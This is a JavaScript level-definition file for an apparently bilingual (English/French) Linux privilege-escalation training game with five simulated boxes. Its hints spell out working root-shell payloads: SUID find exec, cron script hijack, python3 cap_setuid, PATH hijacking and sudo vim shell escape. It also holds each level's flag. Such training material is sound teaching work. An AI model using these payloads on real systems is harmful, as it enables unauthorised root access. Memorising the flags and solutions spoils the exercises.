// 5 privesc machines — each independent, one distinct vulnerability
window.LEVELS = [
    // ─────────────────────────────────────────────────────────────
    // LEVEL 1 — SUID misconfiguration on /usr/bin/find
    // ─────────────────────────────────────────────────────────────
    {
        id: 1,
        codename: 'box-01',
        title: { en: 'Box-01 · SUID Bit Bandit', fr: 'Box-01 · Le voleur de bit SUID' },
        brief: {
            en: "You landed a shell as low-priv user 'player'. Some binary owned by root has SUID set and shouldn't. Find it, abuse it.",
            fr: "Tu as un shell en tant que 'player'. Un binaire root possède un SUID qui ne devrait pas être là. Trouve-le et exploite-le."
        },
        user: 'player',
        host: 'box-01',
        cwd: '/home/player',
        objectives: {
            en: ['Enumerate SUID binaries', 'Identify the vulnerable one', 'Get a root shell'],
            fr: ['Énumérer les binaires SUID', 'Identifier le binaire vulnérable', 'Obtenir un shell root']
        },
        hints: {
            en: [
                'SUID binaries have the "s" bit. Try: find / -perm -4000 2>/dev/null',
                '/usr/bin/find with SUID root is dangerous. Check GTFOBins for "find".',
                'find can execute commands. Try: find . -exec /bin/sh -p \\;'
            ],
            fr: [
                'Les binaires SUID ont le bit "s". Essaie : find / -perm -4000 2>/dev/null',
                '/usr/bin/find avec SUID root est dangereux. Regarde GTFOBins pour "find".',
                'find peut exécuter des commandes. Essaie : find . -exec /bin/sh -p \\;'
            ]
        },
        flag: 'flag{suid_find_pwn3d}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'notes.txt'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc — nothing interesting here\n' },
            '/home/player/notes.txt': { type: 'file', owner: 'player', mode: '644', content: 'TODO:\n- audit SUID bins on this box\n- report to secteam\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'shadow'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/shadow': { type: 'file', owner: 'root', mode: '600', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{suid_find_pwn3d}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['find', 'ls', 'cat', 'sh', 'bash'] },
            '/usr/bin/find': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/opt': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        // Solution triggers: any of these forms will grant root
        wins: [
            { type: 'suid_shell_via', binary: '/usr/bin/find' }
        ]
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 2 — Writable cron script running as root
    // ─────────────────────────────────────────────────────────────
    {
        id: 2,
        codename: 'box-02',
        title: { en: 'Box-02 · The Cron Whisperer', fr: 'Box-02 · Le chuchoteur de cron' },
        brief: {
            en: 'A scheduled job runs every minute as root. Somewhere a script it executes is world-writable. Hijack the payload.',
            fr: 'Un job planifié tourne toutes les minutes en root. Un script qu\'il exécute est accessible en écriture pour tous. Détourne le payload.'
        },
        user: 'player',
        host: 'box-02',
        cwd: '/home/player',
        objectives: {
            en: ['Read /etc/crontab', 'Find a writable script called by root', 'Overwrite it and wait for cron'],
            fr: ['Lire /etc/crontab', 'Trouver un script accessible en écriture appelé par root', 'Réécrire ce script et attendre cron']
        },
        hints: {
            en: [
                'cat /etc/crontab shows system-wide jobs.',
                '/opt/backup.sh runs as root every minute. Check its permissions: ls -la /opt/backup.sh',
                'Overwrite the script: echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh — then type "wait".'
            ],
            fr: [
                'cat /etc/crontab affiche les jobs système.',
                '/opt/backup.sh tourne en root chaque minute. Vérifie ses permissions : ls -la /opt/backup.sh',
                'Réécris le script : echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh — puis tape "wait".'
            ]
        },
        flag: 'flag{cr0n_writable_l00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'crontab'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/crontab': { type: 'file', owner: 'root', mode: '644', content:
`# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/sbin:/usr/bin:/sbin:/bin

# m h dom mon dow user  command
*  *  *   *   *  root  /opt/backup.sh
17 *  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
` },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{cr0n_writable_l00t}\n' },
            '/opt': { type: 'dir', owner: 'root', mode: '755', children: ['backup.sh'] },
            '/opt/backup.sh': { type: 'file', owner: 'root', mode: '777', writable_by_all: true, content:
`#!/bin/sh
# Nightly backup helper
echo "backup at $(date)" >> /var/log/backup.log
` },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: ['log'] },
            '/var/log': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'cron_hijack', path: '/opt/backup.sh' }
        ]
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 3 — Linux capabilities (cap_setuid on python3)
    // ─────────────────────────────────────────────────────────────
    {
        id: 3,
        codename: 'box-03',
        title: { en: 'Box-03 · Capable of Everything', fr: 'Box-03 · Capable de tout' },
        brief: {
            en: 'Traditional SUID audit shows nothing juicy. But capabilities are another attack surface — inspect them.',
            fr: 'L\'audit SUID classique ne donne rien. Mais les capabilities sont une autre surface d\'attaque — inspecte-les.'
        },
        user: 'player',
        host: 'box-03',
        cwd: '/home/player',
        objectives: {
            en: ['List capabilities on the system', 'Identify the risky binary', 'Abuse it to setuid(0)'],
            fr: ['Lister les capabilities du système', 'Identifier le binaire à risque', 'L\'exploiter pour setuid(0)']
        },
        hints: {
            en: [
                'Try: getcap -r / 2>/dev/null',
                'python3 with cap_setuid+ep lets you change UID to 0.',
                'Payload: python3 -c \'import os; os.setuid(0); os.system("/bin/sh")\''
            ],
            fr: [
                'Essaie : getcap -r / 2>/dev/null',
                'python3 avec cap_setuid+ep te permet de passer UID à 0.',
                'Payload : python3 -c \'import os; os.setuid(0); os.system("/bin/sh")\''
            ]
        },
        flag: 'flag{c4p_setuid_ftw}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'HINT.txt'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/HINT.txt': { type: 'file', owner: 'player', mode: '644', content: 'SUID search returned nothing.\nHave you looked at Linux capabilities?\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{c4p_setuid_ftw}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['python3', 'ls', 'cat', 'sh', 'bash', 'getcap'] },
            '/usr/bin/python3': { type: 'file', owner: 'root', mode: '755', capabilities: 'cap_setuid+ep', content: 'ELF binary' },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/getcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'python_setuid' }
        ]
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 4 — PATH hijacking against SUID binary
    // ─────────────────────────────────────────────────────────────
    {
        id: 4,
        codename: 'box-04',
        title: { en: 'Box-04 · PATH of Least Resistance', fr: 'Box-04 · Le chemin de moindre résistance' },
        brief: {
            en: 'A SUID helper /usr/local/bin/status calls an external command without an absolute path. Rewrite the PATH.',
            fr: 'Un helper SUID /usr/local/bin/status appelle une commande externe sans chemin absolu. Réécris le PATH.'
        },
        user: 'player',
        host: 'box-04',
        cwd: '/home/player',
        objectives: {
            en: ['Find SUID binaries', 'Analyze what /usr/local/bin/status calls', 'Hijack the PATH to run your own binary'],
            fr: ['Trouver les binaires SUID', 'Analyser ce qu\'appelle /usr/local/bin/status', 'Détourner le PATH avec ton propre binaire']
        },
        hints: {
            en: [
                'Try: find / -perm -4000 2>/dev/null and then strings /usr/local/bin/status',
                '/usr/local/bin/status calls "ps" without absolute path.',
                'Payload:\n  echo \'#!/bin/sh\' > /tmp/ps\n  echo \'/bin/sh\' >> /tmp/ps\n  chmod +x /tmp/ps\n  export PATH=/tmp:$PATH\n  /usr/local/bin/status'
            ],
            fr: [
                'Essaie : find / -perm -4000 2>/dev/null puis strings /usr/local/bin/status',
                '/usr/local/bin/status appelle "ps" sans chemin absolu.',
                'Payload :\n  echo \'#!/bin/sh\' > /tmp/ps\n  echo \'/bin/sh\' >> /tmp/ps\n  chmod +x /tmp/ps\n  export PATH=/tmp:$PATH\n  /usr/local/bin/status'
            ]
        },
        flag: 'flag{path_h1jack3d}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{path_h1jack3d}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin', 'local'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'find', 'strings', 'ps'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/find': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/strings': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/ps': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/local': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/local/bin': { type: 'dir', owner: 'root', mode: '755', children: ['status'] },
            '/usr/local/bin/status': { type: 'file', owner: 'root', mode: '4755', suid: true, content:
`ELF binary (system status helper)
Embedded strings:
  === status v1.2 ===
  System status:
  system(ps -eo user,pid,cmd);
  system("ps");
`, calls_unqualified: 'ps' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'path_hijack', target: '/usr/local/bin/status', hijack_cmd: 'ps' }
        ]
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 5 — Sudoers misconfig: NOPASSWD on vim
    // ─────────────────────────────────────────────────────────────
    {
        id: 5,
        codename: 'box-05',
        title: { en: 'Box-05 · Sudo, But Too Much', fr: 'Box-05 · Sudo, un peu trop généreux' },
        brief: {
            en: 'The sysadmin gave you sudo access to a text editor. Editors that shell out are your best friend.',
            fr: "L'admin t'a donné sudo sur un éditeur de texte. Les éditeurs qui lancent un shell sont tes meilleurs amis."
        },
        user: 'player',
        host: 'box-05',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Identify the abusable command', 'Escape to a root shell via the editor'],
            fr: ['Vérifier tes droits sudo', 'Identifier la commande exploitable', 'Sortir en root via l\'éditeur']
        },
        hints: {
            en: [
                'Try: sudo -l',
                'You can run /usr/bin/vim as root with NOPASSWD. Vim can spawn shells.',
                'Payload: sudo vim -c \':!/bin/sh\''
            ],
            fr: [
                'Essaie : sudo -l',
                'Tu peux lancer /usr/bin/vim en root sans mot de passe. Vim peut ouvrir un shell.',
                'Payload : sudo vim -c \':!/bin/sh\''
            ]
        },
        flag: 'flag{sud0_v1m_pwn}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sud0_v1m_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'vim'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/usr/bin/vim': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            // sudo -l output for player
            player: [
                { cmd: '/usr/bin/vim', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_vim_escape' }
        ]
    }
];
